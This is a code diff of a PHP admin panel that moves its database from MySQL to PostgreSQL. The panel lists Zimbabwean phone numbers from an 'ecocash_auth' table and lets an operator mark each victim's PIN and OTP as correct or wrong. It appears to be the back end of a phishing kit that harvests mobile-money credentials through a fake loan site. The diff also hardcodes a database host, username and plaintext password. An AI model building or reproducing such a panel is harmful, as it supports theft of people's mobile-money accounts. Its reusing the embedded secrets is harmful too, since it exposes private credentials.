@@ -1,28 +1,39 @@
 <?php
-session_start();
+session_start(); // optional, but kept for consistency
 
-// ========== DATABASE CONFIGURATION ==========
-$dbHost = getenv('DB_HOST');
-$dbPort = getenv('DB_PORT') ?: 3306;
-$dbName = getenv('DB_NAME');
-$dbUser = getenv('DB_USER');
-$dbPass = getenv('DB_PASS');
+// ========== POSTGRESQL CONFIGURATION (same as login.php) ==========
+$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
+$dbPort = 5432;
+$dbName = "loan_9d8q";
+$dbUser = "loan_9d8q_user";
+$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
+// ==================================================================
 
-$pdo = new PDO(
-    "mysql:host=$dbHost;port=$dbPort;dbname=$dbName;charset=utf8mb4",
-    $dbUser,
-    $dbPass,
-    [
-        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-    ]
-);
-// ============================================
+/**
+ * Get PostgreSQL connection (reusable)
+ * @return resource|false
+ */
+function getDbConnection($host, $port, $dbname, $user, $pass) {
+    static $conn = null;
+    if ($conn === null) {
+        if (!function_exists('pg_connect')) {
+            error_log("PostgreSQL extension (pgsql) is NOT available.");
+            return false;
+        }
+        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
+        $conn = @pg_connect($connString);
+        if (!$conn) {
+            error_log("DB connection failed: " . pg_last_error());
+            return false;
+        }
+    }
+    return $conn;
+}
 
-try {
-    $pdo = new PDO("mysql:host=$dbHost;dbname=$dbName;charset=utf8", $dbUser, $dbPass);
-    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
-} catch (PDOException $e) {
-    die("Database connection failed: " . $e->getMessage());
+// Establish connection once
+$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+if (!$conn) {
+    die("Database connection failed. Please check server logs.");
 }
 
 // Handle AJAX requests for updating status
@@ -43,12 +54,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
     $column = ($type === 'pin') ? 'status' : 'otp_status';
     $newValue = ($action === 'correct') ? 1 : 0;
     
-    $stmt = $pdo->prepare("UPDATE ecocash_auth SET $column = :value WHERE phone = :phone");
-    $success = $stmt->execute([':value' => $newValue, ':phone' => $phone]);
+    // Update ALL entries for this phone (in case multiple pins exist)
+    $sql = "UPDATE ecocash_auth SET $column = $1 WHERE phone = $2";
+    $result = pg_query_params($conn, $sql, [$newValue, $phone]);
     
-    if ($success) {
+    if ($result) {
         echo json_encode(['success' => true, 'newValue' => $newValue]);
     } else {
+        error_log("Update error: " . pg_last_error($conn));
         echo json_encode(['success' => false, 'error' => 'Database update failed']);
     }
     exit;
@@ -57,31 +70,54 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WI
 // AJAX endpoint to fetch fresh grouped data (used by polling)
 if (isset($_GET['fetch_data']) && $_GET['fetch_data'] == 1) {
     header('Content-Type: application/json');
-    $stmt = $pdo->query("
+    // PostgreSQL GROUP BY: need to aggregate phone; we use DISTINCT ON or GROUP BY with aggregate functions
+    $sql = "
         SELECT 
-            phone, 
-            MAX(status) AS pin_status, 
-            MAX(otp_status) AS otp_status 
-        FROM ecocash_auth 
-        GROUP BY phone 
+            phone,
+            MAX(status) AS pin_status,
+            MAX(otp_status) AS otp_status
+        FROM ecocash_auth
+        GROUP BY phone
         ORDER BY phone ASC
-    ");
-    $records = $stmt->fetchAll(PDO::FETCH_ASSOC);
+    ";
+    $result = pg_query($conn, $sql);
+    if (!$result) {
+        echo json_encode(['error' => 'Query failed: ' . pg_last_error($conn)]);
+        exit;
+    }
+    $records = [];
+    while ($row = pg_fetch_assoc($result)) {
+        $records[] = [
+            'phone' => $row['phone'],
+            'pin_status' => (int)$row['pin_status'],
+            'otp_status' => (int)$row['otp_status']
+        ];
+    }
     echo json_encode($records);
     exit;
 }
 
 // Initial page load: fetch grouped records for rendering
-$stmt = $pdo->query("
+$sql = "
     SELECT 
-        phone, 
-        MAX(status) AS pin_status, 
-        MAX(otp_status) AS otp_status 
-    FROM ecocash_auth 
-    GROUP BY phone 
+        phone,
+        MAX(status) AS pin_status,
+        MAX(otp_status) AS otp_status
+    FROM ecocash_auth
+    GROUP BY phone
     ORDER BY phone ASC
-");
-$records = $stmt->fetchAll(PDO::FETCH_ASSOC);
+";
+$result = pg_query($conn, $sql);
+$records = [];
+if ($result) {
+    while ($row = pg_fetch_assoc($result)) {
+        $records[] = [
+            'phone' => $row['phone'],
+            'pin_status' => (int)$row['pin_status'],
+            'otp_status' => (int)$row['otp_status']
+        ];
+    }
+}
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -228,13 +264,6 @@ $records = $stmt->fetchAll(PDO::FETCH_ASSOC);
             background-color: #ef4444;
             color: white;
         }
-        .status-updated {
-            animation: highlight 0.5s ease;
-        }
-        @keyframes highlight {
-            0% { background-color: #c6f7d0; }
-            100% { background-color: transparent; }
-        }
         footer {
             padding: 16px 24px;
             background: #f8f9fa;
@@ -268,7 +297,7 @@ $records = $stmt->fetchAll(PDO::FETCH_ASSOC);
     </div>
     <footer>
         ⚡ Click "Verify PIN" or "Verify OTP" → choose "Correct" (✔) or "Wrong" (✘).<br>
-        ✅ Each phone appears once. Status is updated immediately for all rows of that phone.
+        ✅ Each phone appears once. Status is updated for all records of that phone.
     </footer>
 </div>
 
@@ -298,8 +327,8 @@ $records = $stmt->fetchAll(PDO::FETCH_ASSOC);
         let html = '';
         records.forEach(record => {
             const phone = escapeHtml(record.phone);
-            const pinStatus = parseInt(record.pin_status);
-            const otpStatus = parseInt(record.otp_status);
+            const pinStatus = record.pin_status;
+            const otpStatus = record.otp_status;
             
             html += `<tr data-phone="${phone}">`;
             html += `<td>+263 ${phone}</td>`;
@@ -307,16 +336,16 @@ $records = $stmt->fetchAll(PDO::FETCH_ASSOC);
                         <span class="badge ${pinStatus ? 'badge-success' : 'badge-warning'}">
                             ${pinStatus ? 'Verified (1)' : 'Pending (0)'}
                         </span>
-                     </td>`;
+                      </td>`;
             html += `<td class="otp-status-cell">
                         <span class="badge ${otpStatus ? 'badge-success' : 'badge-warning'}">
                             ${otpStatus ? 'Verified (1)' : 'Pending (0)'}
                         </span>
-                     </td>`;
+                      </td>`;
             html += `<td>
                         <button class="btn btn-pin verify-pin" data-phone="${phone}">✔ Verify PIN</button>
                         <button class="btn btn-otp verify-otp" data-phone="${phone}">✔ Verify OTP</button>
-                      </td>`;
+                       </td>`;
             html += `</tr>`;
         });
         tableBody.innerHTML = html;
@@ -381,7 +410,6 @@ $records = $stmt->fetchAll(PDO::FETCH_ASSOC);
             });
             const result = await response.json();
             if (result.success) {
-                // Immediately refresh the table to show updated status
                 await fetchAndRefresh();
                 closeModal();
             } else {
